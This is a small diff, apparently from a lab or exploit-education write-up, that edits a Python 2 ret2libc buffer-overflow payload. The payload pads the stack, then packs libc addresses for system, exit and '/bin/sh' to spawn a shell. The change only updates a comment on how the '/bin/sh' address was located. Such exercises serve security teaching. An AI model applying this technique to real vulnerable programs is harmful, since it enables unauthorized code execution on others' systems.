@@ -665,7 +665,7 @@ import struct
 padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
 system  = struct.pack("I", 0xb7ecffb0) # p system
 exit    = struct.pack("I", 0xb7ec60c0) # p exit {Return after system call}
-bin_sh  = struct.pack("I", 0xb7fb63bf) # strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
+bin_sh  = struct.pack("I", 0xb7fb63bf) # {strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"} & {x/s 0xb7e97000+0x0011f3bf}
 
 print padding+system+exit+bin_sh
 ```
